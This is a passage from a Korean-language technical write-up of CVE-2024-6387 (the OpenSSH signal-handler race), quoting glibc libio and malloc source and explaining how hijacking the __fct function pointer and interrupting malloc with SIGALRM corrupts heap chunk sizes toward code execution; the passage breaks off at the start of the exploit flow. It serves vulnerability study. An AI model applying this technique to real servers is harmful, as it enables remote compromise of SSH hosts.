  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">MAX</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">read_ptr_copy</span> <span class="o">-</span> <span class="o">&amp;</span><span class="n">accbuf</span><span class="p">[</span><span class="n">naccbuf</span> <span class="o">-</span> <span class="n">to_copy</span><span class="p">]);</span>
  <span class="k">else</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">read_ptr_copy</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">__codecvt_error</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="nl">out_eilseq:</span>
	  <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EILSEQ</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
	  <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="cm">/* The read bytes make no complete character.  Try reading again.  */</span>
      <span class="n">assert</span> <span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">__codecvt_partial</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="cm">/* Partially used the buffer for some input data that
		 produces no output.  */</span>
	      <span class="kt">size_t</span> <span class="n">avail</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	      <span class="n">memmove</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">avail</span><span class="p">);</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-=</span> <span class="n">avail</span><span class="p">;</span>
	      <span class="k">goto</span> <span class="n">again</span><span class="p">;</span>
	    <span class="p">}</span>
	  <span class="n">naccbuf</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">&gt;=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">))</span>
	    <span class="k">goto</span> <span class="n">out_eilseq</span><span class="p">;</span>

	  <span class="n">memcpy</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">naccbuf</span><span class="p">);</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="p">{</span>
	  <span class="kt">size_t</span> <span class="n">used</span> <span class="o">=</span> <span class="n">read_ptr_copy</span> <span class="o">-</span> <span class="n">accbuf</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">used</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="n">memmove</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">,</span> <span class="n">read_ptr_copy</span><span class="p">,</span> <span class="n">naccbuf</span> <span class="o">-</span> <span class="n">used</span><span class="p">);</span>
	      <span class="n">naccbuf</span> <span class="o">-=</span> <span class="n">used</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">==</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">))</span>
	    <span class="k">goto</span> <span class="n">out_eilseq</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">;</span>

      <span class="k">goto</span> <span class="n">again</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wfile_underflow</span><span class="p">)</span>
</code></pre></div>    </div>
  </div>
</details>
<p><code class="language-plaintext highlighter-rouge">_IO_wfile_underflow</code>는 다음 흐름을 갖는데 이때 <code class="language-plaintext highlighter-rouge">__fct</code> 함수 포인터를 조작할 수 있기 때문에 원하는 코드를 실행시킬 수 있습니다.</p>

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph4.png" /></p>
<details>
<summary>libio/iofwide.c</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">__codecvt_result</span>
<span class="nf">__libio_codecvt_in</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">codecvt</span><span class="p">,</span> <span class="n">__mbstate_t</span> <span class="o">*</span><span class="n">statep</span><span class="p">,</span>
		    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from_start</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from_end</span><span class="p">,</span>
		    <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">from_stop</span><span class="p">,</span>
		    <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">to_start</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">to_end</span><span class="p">,</span> <span class="kt">wchar_t</span> <span class="o">**</span><span class="n">to_stop</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">enum</span> <span class="n">__codecvt_result</span> <span class="n">result</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="n">gs</span> <span class="o">=</span> <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">status</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">dummy</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from_start_copy</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">from_start</span><span class="p">;</span>

  <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__outbuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">to_start</span><span class="p">;</span>
  <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__outbufend</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">to_end</span><span class="p">;</span>
  <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__statep</span> <span class="o">=</span> <span class="n">statep</span><span class="p">;</span>

  <span class="n">__gconv_fct</span> <span class="n">fct</span> <span class="o">=</span> <span class="n">gs</span><span class="o">-&gt;</span><span class="n">__fct</span><span class="p">;</span>
<span class="cp">#ifdef PTR_DEMANGLE
</span>  <span class="k">if</span> <span class="p">(</span><span class="n">gs</span><span class="o">-&gt;</span><span class="n">__shlib_handle</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">fct</span><span class="p">);</span>
<span class="cp">#endif
</span>
  <span class="n">status</span> <span class="o">=</span> <span class="n">DL_CALL_FCT</span> <span class="p">(</span><span class="n">fct</span><span class="p">,</span>
			<span class="p">(</span><span class="n">gs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">from_start_copy</span><span class="p">,</span>
			 <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">from_end</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
			 <span class="o">&amp;</span><span class="n">dummy</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>

  <span class="o">*</span><span class="n">from_stop</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">from_start_copy</span><span class="p">;</span>
  <span class="o">*</span><span class="n">to_stop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">codecvt</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__outbuf</span><span class="p">;</span>

  <span class="k">switch</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">__GCONV_OK</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">__GCONV_EMPTY_INPUT</span><span class="p">:</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">__codecvt_ok</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="n">__GCONV_FULL_OUTPUT</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">__GCONV_INCOMPLETE_INPUT</span><span class="p">:</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">__codecvt_partial</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>

    <span class="nl">default:</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">__codecvt_error</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>

<p>여기에서 함수 포인터로 참조되는 멤버의 구조는 다음과 같이 구성되게됩니다.</p>

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/structure_graph.png" /></p>

<details>
<summary>libio/libioP.h</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="p">};</span>

<span class="cm">/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */</span>

<span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/bits/types/struct_FILE.h:struct _IO_FILE</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don't get into trouble again.  */</span>
  <span class="kt">char</span> <span class="n">_unused2</span><span class="p">[</span><span class="mi">15</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio.h:_IO_codecvt</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_codecvt</span>
<span class="p">{</span>
  <span class="n">_IO_iconv_t</span> <span class="n">__cd_in</span><span class="p">;</span>
  <span class="n">_IO_iconv_t</span> <span class="n">__cd_out</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio.h:_IO_iconv_t</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="n">step</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">__gconv_step_data</span> <span class="n">step_data</span><span class="p">;</span>
<span class="p">}</span> <span class="n">_IO_iconv_t</span><span class="p">;</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>gconv.h:__gconv_step</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Description of a conversion step.  */</span>
<span class="k">struct</span> <span class="n">__gconv_step</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">__gconv_loaded_object</span> <span class="o">*</span><span class="n">__shlib_handle</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">__modname</span><span class="p">;</span>

  <span class="cm">/* For internal use by glibc.  (Accesses to this member must occur
     when the internal __gconv_lock mutex is acquired).  */</span>
  <span class="kt">int</span> <span class="n">__counter</span><span class="p">;</span>

  <span class="kt">char</span> <span class="o">*</span><span class="n">__from_name</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">__to_name</span><span class="p">;</span>

  <span class="n">__gconv_fct</span> <span class="n">__fct</span><span class="p">;</span>
  <span class="n">__gconv_btowc_fct</span> <span class="n">__btowc_fct</span><span class="p">;</span>
  <span class="n">__gconv_init_fct</span> <span class="n">__init_fct</span><span class="p">;</span>
  <span class="n">__gconv_end_fct</span> <span class="n">__end_fct</span><span class="p">;</span>

  <span class="cm">/* Information about the number of bytes needed or produced in this
     step.  This helps optimizing the buffer sizes.  */</span>
  <span class="kt">int</span> <span class="n">__min_needed_from</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__max_needed_from</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__min_needed_to</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__max_needed_to</span><span class="p">;</span>

  <span class="cm">/* Flag whether this is a stateful encoding or not.  */</span>
  <span class="kt">int</span> <span class="n">__stateful</span><span class="p">;</span>

  <span class="kt">void</span> <span class="o">*</span><span class="n">__data</span><span class="p">;</span>		<span class="cm">/* Pointer to step-local data.  */</span>
<span class="p">};</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>iconv/gconv.h:__gconv_fct</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Type of a conversion function.  */</span>
<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">__gconv_fct</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">__gconv_step</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">__gconv_step_data</span> <span class="o">*</span><span class="p">,</span>
			    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span>
			    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">**</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</code></pre></div>    </div>
  </div>
</details>

<h4 id="exploit-strategy">Exploit strategy</h4>

<p><code class="language-plaintext highlighter-rouge">SIGALRM</code>에 의해서 어떻게 <code class="language-plaintext highlighter-rouge">Exploit</code>을 달성하는지 알아봅시다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1449</span> <span class="err">#</span><span class="n">define</span> <span class="nf">set_head</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>       <span class="p">((</span><span class="n">p</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">mchunk_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="o">------------------------------------------------------------------------</span>
<span class="mi">3765</span> <span class="n">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span>
<span class="mi">3766</span> <span class="p">{</span>
<span class="p">....</span>
<span class="mi">3798</span>   <span class="n">nb</span> <span class="o">=</span> <span class="n">checked_request2size</span> <span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4295</span>               <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4300</span>               <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
<span class="p">....</span>
<span class="mi">4316</span>                   <span class="n">remainder</span> <span class="o">=</span> <span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4320</span>                   <span class="n">bck</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
<span class="mi">4321</span>                   <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
<span class="p">....</span>
<span class="mi">4324</span>                   <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
<span class="mi">4325</span>                   <span class="n">remainder</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
<span class="mi">4326</span>                   <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
<span class="mi">4327</span>                   <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
<span class="p">....</span>
<span class="mi">4337</span>                   <span class="nf">set_head</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
<span class="mi">4338</span>                             <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="n">NON_MAIN_ARENA</span> <span class="o">:</span> <span class="mi">0</span><span class="p">));</span>
<span class="mi">4339</span>                   <span class="nf">set_head</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4343</span>               <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
<span class="p">....</span>
<span class="mi">4345</span>               <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">malloc</code>에서 <code class="language-plaintext highlighter-rouge">4327</code>행이 실행된 이후에 <code class="language-plaintext highlighter-rouge">4339</code>행 이전이 실행되기전 <code class="language-plaintext highlighter-rouge">SIGALRM</code>에 의해 <code class="language-plaintext highlighter-rouge">malloc</code>이 중단되는 경우를 이용합니다.</p>

<p>그렇게되면 <code class="language-plaintext highlighter-rouge">remainder</code>가 쪼개졌지만 크기는 갱신되지 않은 상태로 <code class="language-plaintext highlighter-rouge">unsorted</code> 리스트에 연결되게 됩니다. 이때의 크기 필드값은 갱신되지 않았기 때문에
이전에 이 청크를 할당받은 데이터가 그대로 남아있어 해당 값이 크기 데이터로 사용되게 됩니다. 이렇게하여 커진 <code class="language-plaintext highlighter-rouge">remainder chunk</code>의 크기는 뒷쪽을 덮어쓸 수 있을만큼 커질 수 있습니다.</p>

<p>이를 악용하는 흐름은 다음과 같습니다.</p>

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/exploit_process.png" /></p>

<ul>
